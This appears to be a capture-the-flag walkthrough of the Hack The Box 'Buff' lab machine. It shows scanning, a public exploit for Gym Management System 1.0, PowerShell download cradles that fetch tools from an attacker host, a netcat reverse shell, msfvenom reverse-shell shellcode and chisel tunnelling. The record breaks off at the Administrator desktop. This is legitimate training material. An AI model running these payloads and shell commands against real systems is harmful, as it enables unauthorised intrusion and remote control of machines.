# Buff
## Reconnaissance

* Performed TCP and UDP scans using Nmap & Masscan.
```
kali@kali:~/HTB/buff$ sudo masscan -p1-65535 10.10.10.198 --rate=1000 -e tun0 > ports && ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//') && nmap -Pn -sV -sC -A -p$ports 10.10.10.198
[sudo] password for kali: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-09 05:36:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 00:37 EST
Nmap scan report for 10.10.10.198
Host is up (0.27s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.32 seconds


PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

* Web enumeration
```
dirbuster for http://10.10.10.198:8080
Threads:30
extensions:php,aspx,asp,txt
not recursive
```
![image](https://raw.githubusercontent.com/kookiecrack/images/main/dirbuster-buff.png)

## Delivery and Exploitation
* Webpage suggests that it used Gym Management Software 1.0
![image](https://raw.githubusercontent.com/kookiecrack/images/main/web-enum-buff.png)

* Searchsploit for Gym Management exploit. Webshell obtained
```
kali@kali:~/HTB/buff$ searchsploit -m php/webapps/48506.py
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506     
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators
                                                                                                                  
Copied to: /home/kali/HTB/buff/48506.py                                                                           
                                          

kali@kali:~/HTB/buff$ python 48506.py 'http://10.10.10.198:8080/'
            /\                                           
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/                                                                                                    
                                                                                                                  
[+] Successfully connected to webshell.                                                                           
C:\xampp\htdocs\gym\upload> whoami   
                                                         
buff\shaun                                               
                                                                                                                  
C:\xampp\htdocs\gym\upload> ipconfig                                                                              
                                                         
                                                         
Windows IP Configuration                                 
                                                         
                                                         
Ethernet adapter Ethernet0:                              
                                                         
   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::e08d:2e97:530f:20d2
   Temporary IPv6 Address. . . . . . : dead:beef::281a:6286:c82e:b88c
   Link-local IPv6 Address . . . . . : fe80::e08d:2e97:530f:20d2%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.198 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
                                       10.10.10.2  
                                       

C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt
�PNG

7ddf32e17a6ac5ce04a8ecbf782ca509

```
* Systeminfo
```
C:\xampp\htdocs\gym\upload> systeminfo
�PNG                                                     
                                                         
                                                                                                                  
Host Name:                 BUFF                                                                                   
OS Name:                   Microsoft Windows 10 Enterprise                                                        
OS Version:                10.0.17134 N/A Build 17134                                                             
OS Manufacturer:           Microsoft Corporation                                                                  
OS Configuration:          Standalone Workstation                                                                 
OS Build Type:             Multiprocessor Free                                                                    
Registered Owner:          shaun                 
Registered Organization:                                                                                          
Product ID:                00329-10280-00000-AA218                                                                
Original Install Date:     16/06/2020, 14:05:58                                                                   
System Boot Time:          09/11/2020, 05:39:00       
System Manufacturer:       VMware, Inc.                                                                           
System Model:              VMware7,1                                                                              
System Type:               x64-based PC                  
Processor(s):              2 Processor(s) Installed.     
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019     
Windows Directory:         C:\Windows                                                                             
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2                                                                
System Locale:             en-us;English (United States) 
Input Locale:              en-gb;English (United Kingdom)                                                         
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB                                                                               
Available Physical Memory: 2,531 MB                      
Virtual Memory: Max Size:  4,799 MB                                                                               
Virtual Memory: Available: 2,539 MB
Virtual Memory: In Use:    2,260 MB                                                                               
Page File Location(s):     C:\pagefile.sys                                                                        
Domain:                    WORKGROUP                                                                              
Logon Server:              N/A                           
Hotfix(s):                 N/A                                                                                    
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter                                                         
                                 Connection Name: Ethernet0          
                                 DHCP Enabled:    No                                                              
                                 IP address(es)                                                                   
                                 [01]: 10.10.10.198                                                               
                                 [02]: fe80::e08d:2e97:530f:20d2                                                  
                                 [03]: dead:beef::281a:6286:c82e:b88c                                             
                                 [04]: dead:beef::e08d:2e97:530f:20d2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.   
```
* Use Exploit Suggester
```
kali@kali:~/HTB/buff$ python windows-exploit-suggester.py --database 2020-11-09-mssb.xls --systeminfo systeminfo.t
xt                                                                                                                
[*] initiating winsploit version 3.3...                                                                           
[*] database file detected as xls or xlsx based on extension                                                      [*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)                                                               [*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns                                                                             
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                        
[+] windows version identified as 'Windows 10 64-bit'
[*]                                                                                                               
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                               [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]                                                                                                               
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical                                  [*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Co
nfusion Remote Code Execution                                                                                     [*]   https://github.com/theori-io/chakra-2016-11
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                       
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                              
[*]   https://github.com/foxglovesec/RottenPotato                                                                 [*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Eleva
tion of Privilege                                                                                                 
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation            [*]         
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                              [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers H
eap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC                                                   [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption 
(MS16-074), PoC
[*]                                                                                                               [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC                                      
[*]                                                                                                               
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walke
r Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption        
[*]                                                                                                               
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important           
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF     
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC                                                           
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)                      
[*]                                                                                                               
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                  
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF    
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC                                          
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC                                          
[*]                                                                                                               
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important        
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]                                                      
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important        
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC                                                                          
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC                                      
[*]                                                                                                               
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important        
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC                                                                              
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC                                                     
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)                           
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC                                    
[*]                                                                                                               
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important 
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC                                                                                           
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC                                                                                                               
[*]            
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical                                                                                                                
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC                            
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC         
[*]                                                                                                               
[*] done                                                                                                          
```

* Trigger another reverse webshell
```
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/reverse.php', 'C:\xampp\htdocs\gym\upload\reverse.php')
```

* Use Sherlock.ps1
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Sherlock.ps1')                       
                                                                                                                  
                                                                                                                  
                                                                                                                  
Title      : User Mode to Ring (KiTrap0D)                                                                         
MSBulletin : MS10-015                                                                                             
CVEID      : 2010-0232                                                                                            
Link       : https://www.exploit-db.com/exploits/11199/                                                           
VulnStatus : Not supported on 64-bit systems                                                                      
                                                                                                                  
Title      : Task Scheduler .XML                                                                                  
MSBulletin : MS10-092                                                                                             
CVEID      : 2010-3338, 2010-3888                                                                                 
Link       : https://www.exploit-db.com/exploits/19930/                                                           
VulnStatus : Not Vulnerable                                                                                       
                                                                                                                  
Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                        
MSBulletin : MS13-053                                                                                             
CVEID      : 2013-1300                                                                                            
Link       : https://www.exploit-db.com/exploits/33213/                                                           
VulnStatus : Not supported on 64-bit systems                                                                      

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable
Title      : 'mrxdav.sys' WebDAV                                                                                  
MSBulletin : MS16-016                                                                                             
CVEID      : 2016-0051                                                                                            
Link       : https://www.exploit-db.com/exploits/40085/                                                           
VulnStatus : Not supported on 64-bit systems                                                                      
                                                                                                                  
Title      : Secondary Logon Handle                                                                               
MSBulletin : MS16-032                                                                                             
CVEID      : 2016-0099                                                                                            
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable                              
                            
Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034                                    
CVEID      : 2016-0093/94/95/96             
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Not Vulnerable                                                                                       
                            
Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135                                    
CVEID      : 2016-7255     
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable                              
                            
Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A                                         
CVEID      : 2017-7199     
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable                              
```
* Test MS16-135. Blocked by AV.
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/MS16-135.ps1')                       

IEX : At line:1 char:1
+ Add-Type -TypeDefinition @"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/MS1 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```
* Dropped nc.exe into target machine. Trigger Reverse Shell. Used WinPEAS.bat.

```
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/nc.exe', 'C:\Users\shaun\Desktop\nc.exe')

nc.exe -nv 10.10.14.10 4444 -e cmd.exe
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUNNING PROCESSES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-                             
[i] Something unexpected is running? Check for vulnerabilities                                                    
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                    
                                                                                                                  
Image Name                     PID Services                                                                       
========================= ======== ============================================                                   
System Idle Process              0 N/A                                                                            
System                           4 N/A                                                                            
Registry                       104 N/A                                                                            
smss.exe                       364 N/A                                                                            
csrss.exe                      440 N/A                                                                            
wininit.exe                    516 N/A                                                                            
csrss.exe                      524 N/A                                                                            
winlogon.exe                   588 N/A                                                                            
services.exe                   664 N/A                                                                            
lsass.exe                      676 N/A                                                                            
svchost.exe                    792 N/A                                                                            
fontdrvhost.exe                816 N/A                                                                            
fontdrvhost.exe                824 N/A                                                                            
svchost.exe                    832 N/A                                                                            
svchost.exe                    936 N/A                                                                            
svchost.exe                    980 N/A                                                                            
dwm.exe                        328 N/A                                                                            
svchost.exe                    352 N/A                                                                            
svchost.exe                    740 N/A                                                                            
svchost.exe                     68 N/A                                                                            
svchost.exe                   1028 N/A                                                                            
svchost.exe                   1052 N/A                                                                            
svchost.exe                   1076 N/A                                                                            
svchost.exe                   1196 N/A                                                                            
svchost.exe                   1228 N/A                                                                            
svchost.exe                   1360 N/A                                                                            
svchost.exe                   1368 N/A                                                                            
svchost.exe                   1376 N/A                                                                            
svchost.exe                   1384 N/A                                                                            
svchost.exe                   1480 N/A                                                                            
svchost.exe                   1544 N/A                                                                            
Memory Compression            1608 N/A                                                                            
svchost.exe                   1668 N/A                                                                            
svchost.exe                   1696 N/A                                                                            
svchost.exe                   1756 N/A                                                                            
svchost.exe                   1764 N/A                                                                            
svchost.exe                   1808 N/A                                                                            
svchost.exe                   1912 N/A                                                                            
svchost.exe                   1928 N/A                                                                            
svchost.exe                   1112 N/A      
svchost.exe                   1300 N/A                                          
svchost.exe                   1716 N/A                                          
svchost.exe                   2060 N/A                                          
svchost.exe                   2072 N/A                                          
spoolsv.exe                   2184 N/A                                          
svchost.exe                   2292 N/A                                          
svchost.exe                   2324 N/A                                          
svchost.exe                   2692 N/A                                          
svchost.exe                   2704 N/A                                          
svchost.exe                   2720 N/A                                          
vmtoolsd.exe                  2728 N/A                                          
VGAuthService.exe             2736 N/A                                          
svchost.exe                   2744 N/A                                          
svchost.exe                   2756 N/A                                          
SecurityHealthService.exe     2772 N/A                                          
svchost.exe                   2780 N/A                                          
svchost.exe                   2788 N/A                                          
MsMpEng.exe                   2796 N/A                                          
svchost.exe                   2860 N/A                                          
svchost.exe                   1316 N/A                                          
svchost.exe                   2336 N/A                                          
svchost.exe                   3076 N/A                                          
dllhost.exe                   3592 N/A                                          
WmiPrvSE.exe                  3816 N/A                                          
msdtc.exe                     4084 N/A                                          
svchost.exe                   4212 N/A                                          
sihost.exe                    4272 N/A                                          
svchost.exe                   4296 N/A                                          
svchost.exe                   4364 N/A                                          
taskhostw.exe                 4504 N/A                                          
svchost.exe                   4596 N/A                                          
ctfmon.exe                    4644 N/A                                          
svchost.exe                   4652 N/A                                          
explorer.exe                  2112 N/A                                          
NisSrv.exe                    5448 N/A                                          
svchost.exe                   5676 N/A                                          
svchost.exe                   5748 N/A                                          
svchost.exe                   5840 N/A                                          
ShellExperienceHost.exe       5136 N/A                                          
svchost.exe                    880 N/A                                          
svchost.exe                   6208 N/A                                          
SearchUI.exe                  6292 N/A                                          
RuntimeBroker.exe             6472 N/A                                          
ApplicationFrameHost.exe      6712 N/A                                          
RuntimeBroker.exe             6736 N/A                                          
SearchIndexer.exe             6848 N/A                                          
MicrosoftEdge.exe             6964 N/A                                          
svchost.exe                   7076 N/A                                          
browser_broker.exe            7088 N/A                                          
RuntimeBroker.exe             7124 N/A                                          
Windows.WARP.JITService.e     2628 N/A                                          
svchost.exe                   7268 N/A                                          
RuntimeBroker.exe             7356 N/A                                          
MicrosoftEdgeCP.exe           7744 N/A                                          
MicrosoftEdgeCP.exe           7808 N/A                                          
MSASCuiL.exe                  7960 N/A                                          
vmtoolsd.exe                  5564 N/A                                          
conhost.exe                   8520 N/A           
httpd.exe                     8776 N/A                                          
mysqld.exe                    8816 N/A                                          
svchost.exe                   5368 N/A                                          
httpd.exe                     6552 N/A                                          
svchost.exe                   1452 N/A                                          
SgrmBroker.exe                2392 N/A                                          
svchost.exe                   5372 N/A                                          
svchost.exe                   2896 N/A                                          
Microsoft.Photos.exe          1720 N/A                                          
RuntimeBroker.exe             8344 N/A                                          
WinStore.App.exe              4924 N/A                                          
RuntimeBroker.exe             3336 N/A                                          
SystemSettings.exe            5552 N/A                                          
taskhostw.exe                 4132 N/A                                          
TrustedInstaller.exe          6720 N/A                                          
wermgr.exe                    6544 N/A                                          
TiWorker.exe                   528 N/A                                          
svchost.exe                   9192 N/A                                          
svchost.exe                   6764 N/A                                          
svchost.exe                   8172 N/A                                          
svchost.exe                    536 N/A                                          
cmd.exe                       7636 N/A                                          
conhost.exe                   4948 N/A                                          
nc.exe                        7432 N/A                                          
cmd.exe                       7164 N/A                                          
cmd.exe                        844 N/A                                          
conhost.exe                   2084 N/A                                          
WmiPrvSE.exe                  1516 N/A                                          
CloudMe.exe                   1572 N/A                                          
timeout.exe                   6092 N/A                                          
tasklist.exe                  8500 N/A        


PRIVILEGES INFORMATION                                                                                            
----------------------                                                                                            
                                                                                                                  
Privilege Name                Description                          State                                          
============================= ==================================== ========                                       
SeShutdownPrivilege           Shut down the system                 Disabled                                       
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled                                        
SeUndockPrivilege             Remove computer from docking station Disabled                                       
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                       
SeTimeZonePrivilege           Change the time zone                 Disabled                                       
                                                                                                                  
ERROR: Unable to get user claims information.                                                                     
                                                                                                                  
                                                                                   
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/44470.exe', 'C:\xampp\htdocs\gym\upload\44470.exe')

powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/python27.dll', 'C:\xampp\htdocs\gym\upload\python27.dll')
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/plink.exe', 'C:\xampp\htdocs\gym\upload\plink.exe')
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/nc.exe', 'C:\xampp\htdocs\gym\upload\nc.exe')


kali@kali:~/HTB/buff$ msfvenom -a x86 -p windows/shell_reverse_tcp  -b '\x00\x0A\x0D' -f python LPORT=4444 LHOST=10.10.14.10 -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xbd\xb9\x95\xc8\xd9\xdb\xde\xd9\x74\x24\xf4\x5f"
payload += b"\x29\xc9\xb1\x52\x83\xc7\x04\x31\x6f\x0e\x03\xd6"
payload += b"\x9b\x2a\x2c\xd4\x4c\x28\xcf\x24\x8d\x4d\x59\xc1"
payload += b"\xbc\x4d\x3d\x82\xef\x7d\x35\xc6\x03\xf5\x1b\xf2"
payload += b"\x90\x7b\xb4\xf5\x11\x31\xe2\x38\xa1\x6a\xd6\x5b"
payload += b"\x21\x71\x0b\xbb\x18\xba\x5e\xba\x5d\xa7\x93\xee"
payload += b"\x36\xa3\x06\x1e\x32\xf9\x9a\x95\x08\xef\x9a\x4a"
payload += b"\xd8\x0e\x8a\xdd\x52\x49\x0c\xdc\xb7\xe1\x05\xc6"
payload += b"\xd4\xcc\xdc\x7d\x2e\xba\xde\x57\x7e\x43\x4c\x96"
payload += b"\x4e\xb6\x8c\xdf\x69\x29\xfb\x29\x8a\xd4\xfc\xee"
payload += b"\xf0\x02\x88\xf4\x53\xc0\x2a\xd0\x62\x05\xac\x93"
payload += b"\x69\xe2\xba\xfb\x6d\xf5\x6f\x70\x89\x7e\x8e\x56"
payload += b"\x1b\xc4\xb5\x72\x47\x9e\xd4\x23\x2d\x71\xe8\x33"
payload += b"\x8e\x2e\x4c\x38\x23\x3a\xfd\x63\x2c\x8f\xcc\x9b"
payload += b"\xac\x87\x47\xe8\x9e\x08\xfc\x66\x93\xc1\xda\x71"
payload += b"\xd4\xfb\x9b\xed\x2b\x04\xdc\x24\xe8\x50\x8c\x5e"
payload += b"\xd9\xd8\x47\x9e\xe6\x0c\xc7\xce\x48\xff\xa8\xbe"
payload += b"\x28\xaf\x40\xd4\xa6\x90\x71\xd7\x6c\xb9\x18\x22"
payload += b"\xe7\xcc\xd6\x22\xfd\xb8\xe4\x3a\x10\x65\x60\xdc"
payload += b"\x78\x85\x24\x77\x15\x3c\x6d\x03\x84\xc1\xbb\x6e"
payload += b"\x86\x4a\x48\x8f\x49\xbb\x25\x83\x3e\x4b\x70\xf9"
payload += b"\xe9\x54\xae\x95\x76\xc6\x35\x65\xf0\xfb\xe1\x32"
payload += b"\x55\xcd\xfb\xd6\x4b\x74\x52\xc4\x91\xe0\x9d\x4c"
payload += b"\x4e\xd1\x20\x4d\x03\x6d\x07\x5d\xdd\x6e\x03\x09"
payload += b"\xb1\x38\xdd\xe7\x77\x93\xaf\x51\x2e\x48\x66\x35"
payload += b"\xb7\xa2\xb9\x43\xb8\xee\x4f\xab\x09\x47\x16\xd4"
payload += b"\xa6\x0f\x9e\xad\xda\xaf\x61\x64\x5f\xdf\x2b\x24"
payload += b"\xf6\x48\xf2\xbd\x4a\x15\x05\x68\x88\x20\x86\x98"
payload += b"\x71\xd7\x96\xe9\x74\x93\x10\x02\x05\x8c\xf4\x24"
payload += b"\xba\xad\xdc"
```
* Use chisel for port forwarding
```
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
C:\xampp\htdocs\gym\upload>powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')

C:\xampp\htdocs\gym\upload>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

10/11/2020  05:23    <DIR>          .
10/11/2020  05:23    <DIR>          ..
10/11/2020  05:25         7,490,048 chisel.exe
10/11/2020  05:19                53 kamehameha.php
10/11/2020  05:22            59,392 nc.exe
               3 File(s)      7,549,493 bytes
               2 Dir(s)   7,117,021,184 bytes free

C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.10:8000 R:8888:127.0.0.1:8888
chisel.exe client 10.10.14.10:8000 R:8888:127.0.0.1:8888
2020/11/10 05:26:18 client: Connecting to ws://10.10.14.10:8000
2020/11/10 05:26:19 client: Retrying in 100ms...
2020/11/10 05:26:20 client: Retrying in 200ms...
2020/11/10 05:26:21 client: Retrying in 400ms...
2020/11/10 05:26:23 client: Retrying in 800ms...
2020/11/10 05:26:25 client: Retrying in 1.6s...
2020/11/10 05:26:27 client: Retrying in 3.2s...
2020/11/10 05:26:32 client: Retrying in 6.4s...
2020/11/10 05:26:39 client: Retrying in 12.8s...
2020/11/10 05:26:53 client: Retrying in 25.6s...
2020/11/10 05:27:19 client: Fingerprint e3:8c:29:b2:dc:9a:a3:6a:2b:1b:9c:28:53:72:ed:55
2020/11/10 05:27:19 client: Connected (Latency 22.5745ms)


───────────────────────────────────────────────────────────────────────────────────────────────────────────────
kali@kali:~/HTB/buff$ chisel server --port 8000 --reverse
2020/11/10 00:27:05 server: Reverse tunnelling enabled
2020/11/10 00:27:05 server: Fingerprint e3:8c:29:b2:dc:9a:a3:6a:2b:1b:9c:28:53:72:ed:55
2020/11/10 00:27:05 server: Listening on http://0.0.0.0:8000
2020/11/10 00:27:20 server: session#1: tun: proxy#R:8888=>8888: Listening
```

```
kali@kali:~/HTB/buff$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.198] 49777
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd .. 
cd ..

C:\>cd Users
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

